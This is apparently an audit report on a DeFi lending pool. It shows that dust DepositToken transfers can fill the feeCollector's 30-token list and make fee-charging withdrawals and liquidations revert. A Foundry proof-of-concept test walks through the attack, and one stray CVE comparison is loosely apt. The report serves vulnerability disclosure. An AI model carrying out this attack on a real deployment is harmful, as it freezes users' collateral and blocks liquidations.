### Title
Attacker can permanently DoS withdrawals and liquidations by dust-filling `feeCollector`'s `MAX_TOKENS_PER_USER` list - ([File: contracts/DepositToken.sol, contracts/Pool.sol])

### Summary
`Pool` enforces a hard cap of `MAX_TOKENS_PER_USER = 30` on the combined count of deposit and debt tokens held by any account [1](#0-0) . Every transfer/mint of a `DepositToken` to an account that doesn't hold it calls `pool.addToDepositTokensOfAccount`, which reverts with `UserReachedMaxTokens` once the cap is hit [2](#0-1) . `DepositToken.transfer` is a public, unprivileged entry point that only requires the *sender* to have unlocked balance — the recipient has no say [3](#0-2) . Because the protocol's `feeCollector` receives fee transfers inside `withdraw` and `Pool.liquidate`, filling its token list via dust transfers turns the cap check into a protocol-wide liveness failure.

### Finding Description
When `withdrawFee > 0`, `_withdraw` routes the fee through `_transfer(account_, feeCollector, _fee)`, which triggers `addToDepositTokensOfAccount(feeCollector)` whenever the feeCollector's balance of that deposit token was zero [4](#0-3) . The same happens in `Pool.liquidate`, where the protocol fee is seized to `feeCollector` [5](#0-4) .

An unprivileged attacker can:

1. Deposit a dust amount of each underlying into the pool to obtain dust balances of every `DepositToken` (public `DepositToken.deposit`, no permission needed).
2. Call `DepositToken.transfer(feeCollector, dust)` for each deposit token until `depositTokensOfAccount.length(feeCollector) + debtTokensOfAccount.length(feeCollector) >= 30`.
3. From then on, any `withdraw`/`withdrawFrom`/`flashWithdraw` on a deposit token where the feeCollector's prior balance is 0 reverts at `addToDepositTokensOfAccount` → `UserReachedMaxTokens`, and every `liquidate` with `_fee > 0` reverts the same way.

The `feeCollector` is a protocol-configured address (typically a multisig or contract that never holds deposit tokens), so it is the perfect target: it cannot easily get rid of the dust, and in `seize`-based liquidation paths no actor can bypass the add. Recovery requires governance to either update `feeCollector`, set fees to zero, or have the feeCollector contract transfer dust out — i.e., funds are frozen pending manual intervention.

### Impact Explanation
- **Temporary/permanent freezing of user funds**: all withdrawals that charge a fee revert, locking users' collateral in the `Treasury`.
- **Liquidation liveness failure / insolvency risk**: `liquidate` reverts when `_fee > 0`, blocking bad-debt cleanup exactly when unhealthy positions need liquidation (analogous to CVE-2018-3186's repeatable-crash DoS — a single reproducible condition makes a core operation hang/revert every time).
- The revert is fully deterministic and repeatable on every call, matching the "frequently repeatable crash" bug class.

### Likelihood Explanation
- Requires no privileged role: `deposit` + `transfer` are public.
- Cost is bounded: dust deposits of at most `MAX_TOKENS_PER_USER` distinct deposit tokens (each pool has far fewer), plus gas.
- Preconditions: `withdrawFee > 0` and/or `protocolFee` (liquidation) > 0 in `FeeProvider`, and the feeCollector initially holding < 30 token types — the default state for a fresh/multisig fee collector.
- Partial mitigation exists: users can still withdraw if `feeCollector` already holds a nonzero balance of that specific deposit token (no add is triggered), and a feeCollector EOA could clear dust. For contract/multisig collectors the freeze persists until governance acts, keeping this a genuine DoS.

### Recommendation
- Don't register fee-token deposits in the per-account set: in `_withdraw` and `Pool.liquidate`, mint/route fees via `_mint`-style crediting that skips `addToDepositTokensOfAccount` for the `feeCollector`, or make the add non-reverting (`if (length < MAX_TOKENS_PER_USER) add`).
- Alternatively, hold fees in the pool/treasury accounting rather than as `DepositToken` balances, or let `removeFromDepositTokensOfAccount`/`seize` bypass the cap when `from_`/`to_` is the feeCollector.

### Proof of Concept
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import {Pool} from "contracts/Pool.sol";
import {DepositToken} from "contracts/DepositToken.sol";
import {IDebtToken} from "contracts/interfaces/IDebtToken.sol";

// Fork an existing pool deployment (e.g. Optimism) where feeProvider.withdrawFee() > 0
// and feeProvider.liquidationFees().protocolFee > 0.
contract FeeCollectorDustDoS is Test {
    Pool pool = Pool(POOL_ADDR);
    address feeCollector = pool.poolRegistry().feeCollector();

    function test_dustFillFeeCollector_thenWithdrawReverts() public {
        address attacker = makeAddr("attacker");
        address[] memory dts = pool.getDepositTokens(); // deposit tokens registered in pool

        // 1) Attacker deposits dust of each underlying and transfers dust to feeCollector
        //    until depositTokensOfAccount(feeCollector).length hits the 30 cap.
        for (uint256 i; i < dts.length && pool.getDepositTokensOfAccount(feeCollector).length < 30; ++i) {
            DepositToken dt = DepositToken(dts[i]);
            IERC20 underlying = dt.underlying();
            deal(address(underlying), attacker, 1e6);
            vm.startPrank(attacker);
            underlying.approve(address(dt), 1e6);
            dt.deposit(1, attacker);          // get 1 wei of msdToken
            dt.transfer(feeCollector, 1);     // registers token on feeCollector's list
            vm.stopPrank();
        }
        // (If the pool has fewer deposit tokens, attacker can also acquire dust debt via
        //  issue() on multiple DebtTokens to fill the combined count.)
        assertEq(
            pool.getDepositTokensOfAccount(feeCollector).length +
            pool.getDebtTokensOfAccount(feeCollector).length,
            pool.MAX_TOKENS_PER_USER()
        );

        // 2) Any withdraw that would transfer a nonzero fee to feeCollector now reverts.
        address victim = makeAddr("victim");
        DepositToken dt0 = DepositToken(dts[0]);
        IERC20 u0 = dt0.underlying();
        deal(address(u0), victim, 100e18);
        vm.startPrank(victim);
        u0.approve(address(dt0), 100e18);
        dt0.deposit(100e18, victim);
        vm.expectRevert(Pool.UserReachedMaxTokens.selector);
        dt0.withdraw(50e18, victim);   // reverts: addToDepositTokensOfAccount(feeCollector)
        vm.stopPrank();

        // 3) Same for liquidations with protocolFee > 0:
        //    pool.liquidate(...) reverts at depositToken_.seize(account_, feeCollector, _fee)
        //    because _transfer -> addToDepositTokensOfAccount(feeCollector) hits the cap.
    }
}
```

Invariant broken: **liveness** — `withdraw` and `liquidate` become permanently unreachable until governance rotates `feeCollector` or zeroes fees, i.e., temporary freezing of user collateral and liquidation DoS.
